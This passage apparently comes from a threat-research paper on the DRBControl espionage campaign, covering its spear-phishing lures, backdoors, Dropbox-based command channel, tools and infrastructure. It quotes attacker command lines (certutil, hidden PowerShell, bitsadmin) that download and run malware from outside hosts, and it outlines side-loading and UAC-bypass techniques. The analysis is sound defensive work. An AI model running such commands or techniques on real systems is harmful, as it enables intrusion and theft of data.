Trend Micro provided further\n\nintelligence and context on this particular backdoor. An in-depth analysis\n\nrevealed that the backdoor was being used by an advanced persistent threat\n\n(APT) actor that we dubbed “DRBControl,” as we could not find anything related\n\nto the group in our databases or public malware repositories.\n\nOur analysis also found that the threat actor uses a number of additional\n\nbackdoors and post-exploitation tools, as well as some spear-phishing\n\ndocuments that could have been used during the initial phase of a related\n\ncampaign. One of the backdoors was of particular interest, as it used the file\n\nhosting service Dropbox as a command-and-control (C&C) channel. We shared\n\nour analysis with Dropbox, which has since been working with Trend Micro\n\nregarding the issues.\n\nWe observed that the threat actor behind this campaign had very specific\n\ntargets, as it only goes after gambling and betting companies in Southeast\n\nAsia. We have been made aware that Europe and the Middle East regions are\n\nalso being targeted, but we could not confirm this information at the time of\n\nwriting. The exfiltrated data was mostly comprised of databases and source\n\ncodes, which leads us to believe that the campaign is used for cyberespionage\n\nor gaining competitive intelligence. Some of the backdoors were unknown to us,\n\nwhich could suggest that it is a previously unreported group. However, we also\n\nmanaged to link it to some known threat actors.\n\nThis research paper details the different stages of this campaign, including the\n\ninitial spear-phishing emails, a detailed analyses of the backdoors, and a list of\n\nthe multiple post-exploitation tools. It also covers observations on the threat\n\nactor’s activities and infrastructure, including connections with known APT\n\ngroups.\n\n\n-----\n\n## The Initial Compromise: Spear Phishing\n\nIn targeted attacks, spear phishing is a common infection vector employed[1] by threat actors[2] looking to\n\ngain an initial foothold in their target’s infrastructure. Getting the targets’ email addresses is relatively easy,\n\nusing generic email addresses or specific individuals’ email addresses. The campaign we expose in this\n\nresearch is not an exception: The threat actors use spear phishing to trick the recipient into opening a\n\n.DOCX document.\n\nThe spear-phishing campaign we witnessed was active in May 2019. We could find two different (in terms\n\nof language) — but very similar — kinds of phishing content. The social engineering used in this campaign\n\nappears to be quite straightforward and efficient in terms of meeting the threat actors’ goals.\n\nThe threat actor’s spear-phishing attack targets the organization’s support team.\n\n\nFrom: 2931436431@{BLOCKED}q[.]com\n\nTo: support-<redacted>@<redacted>\n\n\nThe subject changed depending on the language that the targeted support team uses. The _support-_\n\n_cn team, for instance, received an email with the Chinese subject “注册不了的截图” (“cannot register_\n\nscreenshot”), while the support-jp team received a similar email with “error screenshot” as the subject.\n\nMoreover, documents are displayed differently.\n\nFigure 1. Spear-phishing document sent to the Japanese support team\n\n\n-----\n\nFigure 2. Spear-phishing document sent to the Chinese support team\n\nSupport teams are used to receiving requests from customers, and emails that contain screen captures\n\nfrom users may also be commonplace for these teams. However, support teams should be wary of how\n\nunusual it could be for a user to send a .DOCX file that contains the screenshot, which requires additional\n\nuser action (a double-click, in this case) only to show the image.\n\nWe were able to find at least three different versions of the infecting documents. The first version, when\n\ndouble-clicked by the user, embeds an executable file that is launched and acts as a dropper for the\n\nmalware (detected by Trend Micro as Trojan.Win32.CLAMBLING.A).\n\nA second version of the document embeds a .BAT file, which also acts as a downloader for the same\n\nmalware.\n\n\ncd %temp% && certutil -urlcache -split -f http://{BLOCKED}.{BLOCKED}.18.154/debug.exe\n\n&&debug.exe\n\n\nCommand-line content found in an infecting document, downloading and executing a second-stage malware\n\nThe third version of the document uses PowerShell to download the malware.\n\n\ncmd /c start powershell.exe -ep Bypass -NoP -NonI -W Hidden (new-object System.Net.\n\nWebClient).DownloadFile(‘http://{BLOCKED}.{BLOCKED}.18.154/test.cab’,’%TEMP%\\\\test.\n\ncab’); expand ‘%temp%\\\\test.cab’ %temp% -f:* ;Start-Process ‘%TEMP%\\\\config.exe’\n\n\nUsing PowerShell to download and execute a second-stage malware\n\nOur analysis revealed that the first two versions execute the same file (detected as Trojan.Win32.\n\nCLAMBLING.A) on the infected system. We could not retrieve the test.cab file from the third version, but\n\nwe suspect a similar final payload.\n\n\n-----\n\nFigure 3. Malicious document that tricks the user to double-click on the picture and run malicious code\n\n(top: “Registration information error picture”\n\nbottom: “Double-click to enlarge picture”)\n\nWe also found a weaponized document from July 2017 that used a similar PowerShell code to drop\n\na backdoor (analyzed later in this research as type 2), but we could not search for it in our telemetry.\n\nSimilarly, it also tricked the user into double-clicking on an image, which triggers the code execution.\n\n\n-----\n\n## Malware Analysis\n\nThis campaign uses two major backdoors that were previously unknown to us. We also found some\n\nknown malware families such as PlugX and HyperBro, as well as many custom post-exploitation tools.\n\nBelow we describe the loading, persistence, and features of the two backdoors.\n\n##### Type 1 Backdoor\n\n###### Loading the Payload\n\nThis backdoor is written in the C++ language with classes that inherit from virtual classes. The backdoor\n\nis also modular, allowing for expansion with the use of plugins.\n\n###### Current Method: DLL Side-Loading\n\nTo load this backdoor, the threat actor launches the legitimate file _MsMpEng.exe, which is signed by_\n\nMicrosoft and described as an “Antimalware Service Executable.” This executable is vulnerable to DLL\n\nside-loading,[3] wherein an unintended DLL is loaded on a program. In this case, the malicious actor\n\ntakes advantage of it by storing a file named _mpsvc.dll in the same directory. That DLL then opens_\n\na third filename, _mpsvc.mui, which contains the obfuscated backdoor, decodes it, and loads it into a_\n\n_svchost.exe process._\n\nWe found two RAR archive files (detected as Trojan.Win64.CLAMBLING.A) in the wild containing the\n\naforementioned files. The modification time of the embedded files is 2019-07-25.\n\n###### Old Method: Patching of a Legitimate File\n\nInterestingly, we observed a different technique being used in an older version of this backdoor. The threat\n\nactor manually patched some bytes of a legitimate installer for the Chinese archiving software “HaoZip,”\n\n(commonly used in China as an alternative to WinRAR and WinZip) to redirect the code flow to a function\n\nappended at the end of the binary.\n\n\n-----\n\nFigure 4. Legitimate HaoZip installer code\n\nFigure 5. Patched code that redirects the execution flow\n\nThe added function resolves some pointers to several WinAPI functions by comparing them to a hash\n\ngenerated via a simple custom algorithm. The code then loads into memory the binary overlay, which\n\ncontains a routine to decompress and load the final payload. The routine also checks if the process is\n\nbeing debugged by comparing the third bit of the PEB with 0.\n\n\n-----\n\nFigure 6. Debugger check via PEB\n\n###### Backdoor Features\n\nThe dropped payload is a backdoor written in C++. It embeds a configuration file in clear text that contains\n\nthe C&C, the path where the file will be copied, and the service name that will be created.\n\nIf no arguments are provided, the file is copied to the path specified in the configuration, its attributes are\n\nset to the system and hidden, and a value is added to a “Run” registry key to launch it during the next\n\nboot.\n\nFigure 7. AutoRun addition\n\nIt handles the following arguments:\n\n- P: Create a suspended svchost.exe process, inject code, and resume\n\n- O: Initialize plug-ins and backdoor features\n\n- U: Bypass user account control (UAC) with passuac.dll file\n\nRun-time type information (RTTI) is present in the executable, allowing us to obtain the real classes’\n\nnames:\n\n- CHPPlugin: Virtual class implemented by every “plug-in” class\n\n- CHPCmd: Class handling command execution through the terminal\n\n- CHPExplorer: Class providing functions to browse directories, enumerate network shares, read, write,\n\nand execute files\n\n- CHPAvi: Class providing recording of the screen content in AVI format and AVI files enumeration\n\n- CHPKeyLog: Class providing keylogging feature (discussed later)\n\n- CHPPipe: Class providing functions that handle named pipes\n\n\n-----\n\n- CHPProcess: Class providing functions to enumerate and terminate processes\n\n- CHPProxy: Class adding proxy support\n\n- CHPRegedit: Class providing functions to handle registry keys (enumerate, copy, set, delete)\n\n- CHPScreen: Class handling screenshot capture feature\n\n- CHPService: Class providing functions to handle services (create, delete, modify, query, start)\n\n- CHPNet: Virtual class implemented by every “communication protocol” class\n\n- CHPHttp: Network class related to HTTP protocol handling\n\n- CHPTcp: Network class related to TCP protocol handling\n\n- CHPUdp: Network class related to UDP protocol handling\n\n- CHPTelnet: Network class related to Telnet protocol handling\n\nThe malware also sends the infected system’s information (listed below) to the C&C server:\n\n- Hostname (or IP address if no hostname is found)\n\n- Computer name\n\n- Current privileges (System/Admin/User)\n\n- Windows version\n\n- Current time\n\n- Fixed string (likely the campaign identifier)\n\nBefore sending the information, the data is obfuscated by swapping each character with its position in a\n\nfixed substitution table.\n\nFigure 8. Substitution algorithm\n\n\n-----\n\n###### The Use of Dropbox in Its Infection Chain\n\nAn important feature appeared in the recent version of this backdoor: A new thread that adds a new C&C\n\nchannel by using the Dropbox API. The thread waits 30 minutes before doing anything, then gathers the\n\nfollowing information about the host:\n\n- Local IP address\n\n- Computer name\n\n- Username\n\n- Operating system (OS) version\n\n- Malware version (fixed string; we saw values ranging from 1.0 to 9.0)\n\n- Content of the registry key: HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\\strDataDir +\n\n“wallet.dat”\n\n- Existence: “YES” if the wallet file exists, “NO” if otherwise\n\nThis information is written in plain text to Dropbox by using the API in a file named with the current date\n\nand time. The malware then searches for a file named bin.asc in a specific Dropbox directory. If this file\n\nexists, the malware checks if it starts with “GIF” then decrypts the rest of it, starts a suspended svchost.\n\nexe process, writes the decrypted shellcode to it, and resumes its execution.\n\nWe found different payloads being delivered through Dropbox that will be covered in a separate section\n\nbelow. It is worth noting that the threat actor used multiple Dropbox repositories, each one storing different\n\ninformation. They were split as the following:\n\n- Backdoor and storage of target user’s workstation information\n\n- Storage of commands, results, heartbeats, and post-exploitation tools\n\n- Stolen files from target user’s computer\n\nThe versioning shows the malware’s rapid pace of development — Version 1.0 was used in late May 2019,\n\nversion 8.0 in late July 2019, and version 9.0 at the beginning of October 2019.\n\n\n-----\n\nWinDRM/Firewall\n\nEnter side-loading Unpack loader in Load MUI file to Execute unpack load Start svchost.exe\nStart\nDLL memory memory in MUI file and inject DLL\n\nsvchost\n\nConnect to C&C Wait for command\n\nStart\n\nInformation Upload info to Check Dropbox Start svchost.exe\n\nFound\n\ngathering Dropbox payload and inject payload\n\nsvchost\n(second channel)\n\nUnpack and execute Load second payload Unpack and execute Remote control via\nStart\nfirst payload from Dropbox second payload Dropbox\n\nFigure 9. Code flow of the latest version of the backdoor\n\n###### Keylogger Feature\n\nThe keystrokes are logged to the file %USERPROFILE%\\AppData\\Roaming\\(IID).log, while the clipboard\n\nis stored in the file %USERPROFILE%\\AppData\\Roaming\\(IID).pas. They are obfuscated via a very simple\n\nalgorithm:\n\nFigure 10. Keylogger encryption algorithm\n\nAfter decryption, the files will look like this:\n\nFigure 11. Sample of logged keystrokes\n\n\n-----\n\nFigure 12. Sample of a logged clipboard\n\nIt is worth noting that the first sample we found has no campaign name or version number, and the\n\nDropbox feature is not present. It also embeds only two plug-ins (CHPCmd and CHPExplorer) and two\n\nnetwork plug-ins (CHPTcp and CHPHttp), and does not implement the UAC bypass feature. This is the\n\nsample that we found being dropped by spear-phishing documents. It should also be noted that checking\n\nfor Bitcoin wallets was removed in version 9.0.\n\nAs previously mentioned, the first backdoor is downloaded from Dropbox, and itself uses Dropbox as its\n\nC&C channel. The backdoor handles different commands, as listed below:\n\n- 0x02: Enumerates drives\n\n- 0x03: Enumerates files\n\n- 0x04: Executes file and sends output to C&C\n\n- 0x05: File operation:\n\nº 0x01: Moves\n\nº 0x02: Copies\n\nº 0x03: Deletes\n\nº 0x04: Renames\n\n- 0x06: Uploads file to Dropbox\n\n- 0x07: Downloads file from Dropbox\n\n- 0x08: Executes command via console\n\n- 0x09: Runs binary through process hollowing\n\nWhen starting, a machine ID is generated and stored in HKEY_LOCAL_MACHINE\\Software\\Classes\\\n\nCLSID\\<IID>. A directory named <IID> is also created in Dropbox, which will be used to store files\n\nharvested from the victim.\n\nThe code uses three hardcoded filenames:\n\n- yasHPHFJ: Contains commands to execute\n\n- Csaujdnc: Contains the result of the execution\n\n- eLHgZNBH: Heartbeat\n\n\n-----\n\n##### Dropbox-Downloaded Backdoor Loader\n\nSince the Dropbox-downloaded backdoor is loaded into memory by the type 1 malware, it cannot run\n\nalone. Consequently, we found another malware family that has the unique purpose of running those\n\nDropbox backdoors.\n\nThis backdoor also uses the DLL side-loading technique,[4] this time abusing a vulnerability in some versions\n\nof the legitimate Windows service IKEEXT, which is used for IPsec connections.[5, 6] This service loads a\n\nDLL named _wlbsctrl.dll from directories in the PATH variable. We saw the actor copying a malicious_\n\nwlbsctrl.dll file to the following directories:\n\n- C:\\ProgramData\\Oracle\\Java\\javapath\\\n\n- C:\\ProgramData\\\n\n- C:\\Users\\Administrator\\AppData\\Roaming\\npm\\\n\n- C:\\ProgramData\\GooGet\\\n\n- C:\\php\\\n\n- C:\\Windows\\System32\\\n\nThe code is very short; the malware will retrieve pointers to some specific functions, parse the header of\n\nthe file to be loaded looking for some pointers, and pass them all as arguments to the Dropbox backdoor.\n\nDropbox has since clarified that concerned tokens were expired in August.\n\n##### Communication Redirection\n\nWe found a sample related to this case. The sample implements some of the classes mentioned earlier\n\nwith a few more:\n\n- CHPHttp\n\n- CHPNet\n\n- CHPTcp\n\n- CHPUdp\n\n- CHPListener: Virtual class implemented by network listeners\n\n- CTcpListener: Class redirecting TCP communications\n\n- CUdpListener: Class redirecting UDP communications\n\n\n-----\n\nThis sample works as a network redirector and interprets four parameters:\n\n- l: Listen port\n\n- p: Remote server IP address\n\n- r: Remote server port\n\n- m: Protocol (TCP or UDP)\n\nThe traffic of the specific protocol arriving on the specified port will be redirected to the remote IP and\n\nport. The compilation timestamp of this sample is 2019-08-24.\n\n##### Type 2 Backdoor\n\n###### Loading the Payload\n\nThe second backdoor type that we found was also written in the C++ language. To unpack this backdoor,\n\nthe threat actor uses the Microsoft executable that is vulnerable to DLL side-loading, similar to the one\n\nused in the type 1 backdoor.\n\nA compressed and obfuscated version of the backdoor is stored in a file with a fake .RTF extension. That\n\nfile is loaded and unpacked by a specially crafted mpsvc.dll file, which is being loaded by the Microsoft\nsigned file MsMpEng.exe.\n\n###### Backdoor Features\n\nThis backdoor uses a configuration file that contains information such as the C&C domain and connection\n\nport, the directory and filename where the malware is copied, and the name and description of the service\n\nthat is created for persistence. The configuration is obfuscated by a simple algorithm embedded in the\n\nPE file.\n\n\n-----\n\nFigure 13. Config decryption routine\n\nWhen the malware is first run, the obfuscated configuration is appended to a randomly generated GUID\n\nand stored in the HKLM (or HKCU)\\SOFTWARE\\Plus registry key inside the CFG value. When the backdoor\n\nis run without arguments, it will create a copy of itself in the directory specified in the configuration file.\n\nThe malware then sets its persistence mechanism. Depending on the user privilege, it will either create a\n\nservice or modify the HKEY_CURRENT_USER\\Microsoft\\Windows\\Run registry key to run itself with the\n\n–PO argument. If necessary, it will also run itself with the –UC argument to bypass UAC.\n\nThe following arguments are handled (one at a time):\n\n- PO: Injects backdoor into svchost.exe via process hollowing and runs it with “-OE” argument\n\n- OE: Initializes all plug-ins and starts communication with C&C; one of the threads runs the backdoor\n\nwith the –KG argument on every RDP session\n\n- UC: UAC bypass\n\n- KG: Keylogging feature initialization (discussed later)\n\nLike in the type 1 backdoor, the RTTI information is available in this sample. The following classes were\n\nobserved:\n\n- CNet: Virtual class implemented by other network-related classes\n\n- CNetHttp: Class related to HTTP communication protocol\n\n- CNetTcp: Class related to TCP communication protocol\n\n\n-----\n\n- CPlugin: Virtual class implemented by other classes\n\n- CFileManager: Class related to file handling (read, write, list, execute, etc.)\n\n- CKeylog: Class related to keylogging feature (discussed later)\n\n- CMuture: Class handling console input and output\n\n- CPortMap: Class handling socket binding\n\n- CShell: Class handling command execution via _cmd.exe; input and output are handled through_\n\nnamed pipes\n\n###### Keylogger Feature\n\nA thread makes sure that the backdoor runs with the “-KG” parameter inside every RDP session.\n\nFigure 14. Backdoor set to run with the “-KG” parameter\n\nA file named %USERNAME%.rpt is created in the same directory as the malware using this output format:\n\n_%username% | [YYYY-mm-dd HH:MM:sss] | <process name> | <window title>. The file is obfuscated_\n\nbefore being written to disk using a simple algorithm:\n\nFigure 15. %Username%.rpt obfuscation routine\n\nWe found three samples related to this backdoor. The only difference was the embedded configuration\n\nfile. The samples, together with their C&Cs, file paths, and service names, can be found in the IoCs.\n\nWe also discovered an old version of this backdoor being dropped by a weaponized Microsoft Word\n\ndocument from July 2017. The C++ classes were named similarly. This suggests that DRBControl is not\n\na newcomer.\n\n\n-----\n\n## Other Malware Families Used\n\nWe found several other malware families related to DRBControl. The found families are a mix of widely\n\nknown and less common malware.\n\n##### PlugX RAT\n\nWe found a variant of the well-known PlugX malware using the same C&C utilized by a type 1 backdoor\n\nsample from the campaign. The hardcoded version number in the binary is “0x20120123” and the\n\nconfiguration file is 0x150C bytes long. The C&Cs are www.kkxx88866[.]com and www.betwln520[.]com,\n\nand the file is copied under the %ALLUSERSPROFILE%\\Mico directory.\n\nSome strings from the regular PlugX have been slightly modified, likely in an attempt to evade simple\n\ndetection rules. As examples, “JoProcBroadcast” became “J0Pr0cBr0adcast”, and “OlProcNotify”\n\nbecame “0lPr0cN0tify”.\n\nThe malware is also dropped via the DLL side-loading technique. Although this time, the vulnerable\n\nfile is a legitimate Chrome installer that loads a malicious _goopdate.dll file.[7, 8] This .DLL file decrypts,_\n\ndecompresses, and loads a third file named _license.rtf, which is the final PlugX malware. The similar_\n\nnaming is yet another link to the TTP of DRBControl.\n\nThe malware was found because of the shared infrastructure, but we do not have any insight into the way\n\nor the time it was used. Some hints point toward a very old sample — we found it in a .ZIP file named\n\n_KB3023607.zip, which relates to a fix that Microsoft issued in February 2015.[9] Moreover, the compilation_\n\ndate of the unpacked sample indicates 2015-10-14, but the modification date of license.rtf in the ZIP file\n\nis 2018-08-10. It also seems that no IP address has been assigned to the C&C domains until March 2018.\n\n##### Trochilus RAT\n\nTwo samples belonging to the Trochilus RAT family can be linked to domain names that DRBControl\n\nused. The samples are Nullsoft Scriptable Install System (NSIS) installers that drop two files: rpcss.dll and\n\n_data.dat, which is the backdoor in an encrypted format._\n\n\n-----\n\nBoth samples copy the files to %ALLUSERPROFILE%\\Medialoader, and, if running with admin privileges,\n\ncreate a service named medialoader that runs the DLL at boot time. The setup443.exe file was hosted at\n\nthe address hxxp://juchaoba[.]com/plus/guestbook/images/setup443.exe. We speculate that the site was\n\ncompromised to host the setup443.exe file.\n\nThe _diskshawin.exe file is dropped by an SFX RAR file, which drops three files (run64.bat,_ _csres.exe,_\n\nand diskshawin.exe) into %SystemRoot%\\Fonts and launches run64.bat. Csres.exe is a custom installer,\n\nwhich, based on the user privileges, will either create a service named SESSRV, use UAC bypass, or just\n\nrun the malware during every RDP session.\n\nThis installer creates several mutexes that have been seen in other known malware families linked to\n\ndomain names reportedly used by the Winnti group.[10] We discuss this later in the Links with Known Threat\n\nActors section.\n\n##### MFC Keyloggers\n\nWe also found two additional malware samples using the Microsoft Foundation Class (MFC) library\n\nand has links to the domain name shopingchina[.]net used in this campaign. The purpose is to capture\n\nclipboard and keystroke data and send it to a PHP script hosted on the C&C.\n\n##### HyperBro\n\nThe custom in-memory HyperBro backdoor[11] was also found to make up DRBControl’s arsenal. Loading\n\nthe payload is similar to the type 1 backdoor, which involves abusing a legitimate Microsoft executable,\n\nbut this time the MsMpEng.exe executable is a 32-bit file.\n\nThe encrypted backdoor is stored in a file named _thumb.dat, which is decrypted and loaded by the_\n\nmpsvc.dll file. An additional config.ini file contains a GUID. By looking at the RTTI class names, we found\n\nclasses that were not present in a Palo Alto blog post[12] on HyperBro:\n\n- VTClipboardInfo\n\n- VTClipboardMgr\n\n- VTFileRename\n\n- VTFileRetime\n\n- VTKeyboardInfo\n\n- VTKeyboardMgr\n\n- VTRegeditKeyInfo\n\n- VTRegeditMgr\n\n- VTRegeditValueInfo\n\n\n-----\n\nThe class VTFileDataRes was removed, and the URI pattern to contact the C&C changed from “/ajax” to\n\n“/api/v2/ajax”. Another difference was the options passed to the compiler, as our sample did not use a\n\nstack cookie (/GS in Visual Studio).\n\nThe sample contained a hardcoded version number and date of 2.0.9 and “Feb 04 2015.” From an\n\ninfrastructure point of view, the C&C had striking similarities with the more recent C&C used by the type 1\n\nbackdoor, which led us to believe that this sample is related to DRBControl.\n\n##### Cobalt Strike\n\nWe also found a sample of Cobalt Strike linked to the cdn[.]kkxx888666[.]com subdomain. The same\n\ndomain name has been used by an old type 1 backdoor and a PlugX sample.\n\n\n-----\n\n## Post-Exploitation Tools\n\nDuring our research, we found several other tools used by DRBControl. Among its arsenal were a clipboard\n\nstealer, wherein the content is encrypted with the same algorithm as the type 1 backdoor; a network traffic\n\ntunnel named EarthWorm;[13] a public IP address retriever;[14] an NBTScan tool for enumerating NetBIOS\n\nshares; a brute-force tool;[15] and an elevation of privilege tool for exploiting CVE-2017-0213.[16] We also\n\ndiscovered password dumpers, tools for bypassing UAC, and code loaders in the post-exploitation tools.\n\n##### Password Dumpers\n\nWe found multiple password dumpers in DRBControl’s toolkit. Some of them were known, such as\n\nQuarks PwDump and modified versions of Mimikatz that only dump login passwords. Others are based\n\non publicly available source codes.[17, 18] Based on the PDB path, the latter was named NetPwdDump by\n\nthe malicious actor. Another tool dumps SQLite data from the files stored on the “\\Google\\Chrome\\User\n\nData\\Default\\Login Data” directory.\n\n##### UAC Bypass\n\nMany samples were simple implementations of publicly known techniques for bypassing UAC. Implemented\n\ntechniques include UAC bypass via elevated .NET applications,[19] Win7Elevate,[20] and eventvwr.exe and\n\nregistry hijacking.[21]\n\n##### Code Loaders\n\nMany of the tools used were simple code loaders. DRBControl might be using them to bypass code\n\nexecution restrictions or evade security solutions.\n\nOne of them takes a hostname and a port as the parameter, uses the information to connect to a server,\n\ndownloads code (probably a position-independent shellcode), and executes it. Another tool, named\n\nNetUseEngine on the PDB information, is used to create a service and launch it when the system boots.\n\nIt takes three parameters: install, special, or uninstall.\n\nThe malicious actor also wrote a tool to run a command by copying it inside a run.sct file and executing it\n\nvia the Squiblydoo technique.[22] Others are even simpler, launching c:\\programdata\\b.bat via WinExec or\n\n_CreateProcessA. We even found a b.bat file launching Mimikatz._\n\n\n-----\n\n## Infrastructure Analysis\n\nThere were not many domain names linked to DRBControl, and the infrastructure was diverse. In most\n\ncases, we could resolve IP addresses only for the subdomains hardcoded in the malware samples, but\n\nthe domain names didn’t have IP addresses linked to them. On multiple occasions, different subdomains\n\nled to different malware families. For instance, the attacker pointed some domain names to 127.0.0.1,\n\nwhich is a known practice of some threat actors.\n\nMore recently, the attacker switched to IP addresses that, based on the Whois Lookup record, can\n\nbe identified within the Google Cloud address space. (It should be noted, however, that this does not\n\nnecessarily mean a direct abuse to the platform.) When browsing the C&C domain names or IP addresses,\n\nwe noticed the returned content was a simple HTTP header that redirects the user to a legitimate website\n\nsuch as Google or Dropbox. This is consistent with the malicious domain names that sometimes contained\n\nthe company names.\n\n##### Review of DRBControl’s Activities\n\nDRBControl’s activities can be reviewed based on the commands they sent to 67 different IDs:\n\n**List files**\n\n**Run command**\n\n**Upload file**\n\n**Download file**\n\n**List drives**\n\n**Delete file**\n\n**Execute file**\n\n**Rename file**\n\n**Copy file**\n\n0 1,000\n\nFigure 16. Command type sent by DRBControl\n\n\n-----\n\n|Command|Number of occurrences|\n|---|---|\n|netstat -ano tasklist systeminfo query user ipconfig /all whoami reg query “HKEY_CURRENT_USER\\Software\\ Microsoft\\Terminal Server Client\\Default” dir wlbsctrl.dll type log.txt set|24 19 19 18 16 15 12 11 10 10|\n\n\nTable 1. Top 10 commands issued by DRBControl through “cmd /c”\n\nOf the 51 files that the attacker deleted, the majority were post-exploitation tools. Notably, in two cases,\n\nthe attacker deleted the file _c:\\ProgramData\\SxS\\NvSmart.hlp, which is known to contain keylogging_\n\ninformation generated by the PlugX malware. All of the downloaded files were post-exploitation tools.\n\nAmong the uploaded files, there were many Office and PDF documents, key logs, SQL dumps, browser\n\ncookies, and even a KeePass database. Another interesting note is that the download and upload\n\ncommands included the remote file path as an argument, which allowed us to see how the attacker\n\norganizes its files.\n\nSome parent directories from which the attacker copied the stolen files were interesting: “C:\\Projects\\\n\nDropbox\\Test Version\\DRBControl\\Release\\Downloads\\”, or “C:\\Users\\Win2008_x64\\Desktop\\drb\\\n\nDownloads\\”. The attacker would then create a directory structure of “[ <victim’s IP address> ]\\[ <victim’s\n\nID> ]+[ <username> ]\\<stolen file path>” or “<Victim’s ID>(<computer name>)\\<stolen file path>”. Some\n\nof the attacker’s directory names contained Chinese words, such as “备份” (“backup”) and “UAC 提权”\n\n(“UAC elevation”).\n\n\n-----\n\n## Links with Known Threat Actors\n\nOur first speculation was that this attacker was new, as we had never seen the type 1 and type 2 backdoors\n\nbefore and did not find infrastructure similarities with other threat actors. However, our analysis revealed\n\nsome connections to known threat actors, listed below.\n\n##### Winnti\n\nAside from being motivated by profit, the Winnti group has gained notoriety for their involvement in various\n\nmalicious activities associated with targeted attacks and utilizing self-developed, technically-proficient\n\ntools in their attacks.[23] Over the years, Winnti-related activities have suggested that there are likely more\n\nthan one group of attackers behind the Winnti umbrella.[24]\n\nIt is highly probable that Winnti is comprised of several closely related threat actors that share tools and\n\nparts of attack infrastructures. How closely they work together is still unknown. Some speculate that there\n\nmight be one central development group providing malware and tools for the others, or that each entity\n\ncreates its own software that they later share with peers.\n\nThe first link we found was the mutexes shared between two malware families with different infrastructure.\n\nOne of the Trochilus samples, named diskshawin.exe, had links to the domain name fn.shopingchina[.]net\n\nand is dropped by a custom installer file that uses the following mutexes:\n\n- cc5d64b344700e403e2sse\n\n- cc5d6b4700e403e2sse\n\n- cc5d6b4700032eSS\n\nThe mutexes were also found in a BbsRat sample, which is named diskwinshadow.exe and contacts the\n\ndomain name bot.googlerenewals[.]net. The same domain name has been listed in a 2017 Clearsky report\n\non the Winnti group’s activities.[25]\n\n\n-----\n\nThe second and third link we found come from two commands issued by the attacker in a compromised\n\nmachine:\n\n- bitsadmin /transfer n http://185.173.92[.]141:33579/i610.exe c:\\users\\public\\wget.exe\n\n- bitsadmin /transfer n http://185.173.92[.]141:33579/t32d.exe c:\\users\\public\\wget.exe\n\nA look into the passive DNS of the IP address 185.173.92[.]141 revealed that the domain name asia.\n\ngooglerenewals[.]net was used close to the timeline of our incident. Finally, we searched for executables\n\nnamed _t32d.exe and found a sandbox report for a malware contacting the domain name test3._\n\nfacebooknavigation[.]com. Like googlerenewals[.]net, facebooknavigation[.]com was also listed as Winnti\nrelated in the aforementioned report.\n\n##### Emissary Panda/LuckyMouse/APT 27\n\nWe also found some links with Emissary Panda (a.k.a. LuckyMouse, APT27, and Iron Tiger). The first one\n\ninvolves the use of the HyperBro backdoor, which appears to be exclusive to the threat actor. All reports\n\nwe found on this backdoor mention campaigns attributed to Emissary Panda.[26, 27]\n\nWhile it is a very loose link, we also noticed that the packed version of HyperBro was named thumb.db in\n\nthe Emissary Panda case, while the one in this campaign is named thumb.dat. The executable used for\n\nDLL side-loading, however, is entirely different.\n\nHaving found relations with Winnti and Emissary Panda reminded us that we also found some signed\n\nmalware certificates being shared by both groups in the past.\n\n\n-----\n\n## Conclusion\n\nAttribution is a complicated aspect of cybersecurity, and it is not the goal of this publication. What we have\n\ndiscovered in our analysis, however, is the existence of a significant number of indicators of compromise\n\n(IoCs) and intriguing connections with at least two known APT groups.\n\nThis research delves into the modus operandi and different kinds of malware used by DRBControl, whose\n\ngoal is to steal source code and data from gambling and betting companies located in Asia.\n\nWe did not find information regarding attacks in other parts of the world. However, this is not to say that\n\nthere has been none.\n\nThe threat actor described here shows solid and quick development capabilities regarding the custom\n\nmalware used, which appears to be exclusive to them. The campaign exhibits that once an attacker gains\n\na foothold in the targeted entity, the use of public tools can be enough to elevate privileges, perform lateral\n\nmovements in the network, and exfiltrate data.\n\n###### Trend Micro Solutions\n\nTrend Micro™ Deep Discovery™ provides detection, in-depth analysis, and proactive response to today’s\n\nstealthy malware and targeted attacks in
